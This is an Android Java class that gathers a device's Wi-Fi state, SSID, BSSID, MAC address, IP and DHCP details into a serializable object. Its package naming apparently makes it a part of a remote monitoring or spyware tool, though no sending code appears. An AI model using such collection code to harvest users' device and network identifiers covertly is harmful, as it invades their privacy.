package Transfer;

import android.content.Context;
import android.net.DhcpInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;

import static android.net.wifi.WifiManager.WIFI_STATE_DISABLED;
import static android.net.wifi.WifiManager.WIFI_STATE_DISABLING;
import static android.net.wifi.WifiManager.WIFI_STATE_ENABLED;
import static android.net.wifi.WifiManager.WIFI_STATE_ENABLING;
import static android.net.wifi.WifiManager.WIFI_STATE_UNKNOWN;

public class Wifi implements Serializable {

  public String BSSID;
  public int DNS1;
  public int DNS2;
  public int FREQUENCY;
  public int GATEWAY;
  public int IPADDRESS;
  public boolean IS5GHZBANDSUPPORTED;
  public boolean ISDEVICETOAPRTTSUPPORTED;
  public boolean ISENHANCEDPOWERREPORTINGSUPPORTED;
  public boolean ISP2PSUPPORTED;
  public boolean ISPREFERREDNETWORKOFFLOADSUPPORTED;
  public boolean ISSCANALWAYSAVAILABLE;
  public boolean ISTDLSSUPPORTED;
  public boolean ISWIFIENABLED;
  public int LEASEDURATION;
  public int LINKSPEED;
  public String MACADDRESS;
  public int NETMASK;
  public int NETWORKID;
  public int RSSI;
  public int SERVERADDRESS;
  public String SSID;
  public String WIFISTATE;

  public Wifi() {
    try {
      WifiManager wifiManager =
          (WifiManager) MyService.context.getSystemService(Context.WIFI_SERVICE);
      if (wifiManager.getWifiState() == WIFI_STATE_DISABLED) {
        WIFISTATE = "Disabled";
      } else if (wifiManager.getWifiState() == WIFI_STATE_DISABLING) {
        WIFISTATE = "Disabling";
      } else if (wifiManager.getWifiState() == WIFI_STATE_ENABLED) {
        WIFISTATE = "Enabled";
      } else if (wifiManager.getWifiState() == WIFI_STATE_ENABLING) {
        WIFISTATE = "Enabling";
      } else if (wifiManager.getWifiState() == WIFI_STATE_UNKNOWN) {
        WIFISTATE = "Unknown";
      }

      if (VERSION.SDK_INT >= 21) {
        IS5GHZBANDSUPPORTED = wifiManager.is5GHzBandSupported();
        ISDEVICETOAPRTTSUPPORTED = wifiManager.isDeviceToApRttSupported();
        ISENHANCEDPOWERREPORTINGSUPPORTED = wifiManager.isEnhancedPowerReportingSupported();
        ISP2PSUPPORTED = wifiManager.isP2pSupported();
        ISPREFERREDNETWORKOFFLOADSUPPORTED = wifiManager.isPreferredNetworkOffloadSupported();
        ISTDLSSUPPORTED = wifiManager.isTdlsSupported();
      }

      if (VERSION.SDK_INT >= 18) {
        ISSCANALWAYSAVAILABLE = wifiManager.isScanAlwaysAvailable();
      }

      ISWIFIENABLED = wifiManager.isWifiEnabled();
      WifiInfo connectionInfo = wifiManager.getConnectionInfo();
      BSSID = connectionInfo.getBSSID();

      if (VERSION.SDK_INT >= 21) {
        FREQUENCY = connectionInfo.getFrequency();
      }

      LINKSPEED = connectionInfo.getLinkSpeed();
      MACADDRESS = connectionInfo.getMacAddress();
      NETWORKID = connectionInfo.getNetworkId();
      RSSI = connectionInfo.getRssi();
      SSID = connectionInfo.getSSID();
      DhcpInfo dhcpInfo = wifiManager.getDhcpInfo();
      DNS1 = dhcpInfo.dns1;
      DNS2 = dhcpInfo.dns2;
      GATEWAY = dhcpInfo.gateway;
      IPADDRESS = dhcpInfo.ipAddress;
      LEASEDURATION = dhcpInfo.leaseDuration;
      NETMASK = dhcpInfo.netmask;
      SERVERADDRESS = dhcpInfo.serverAddress;
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
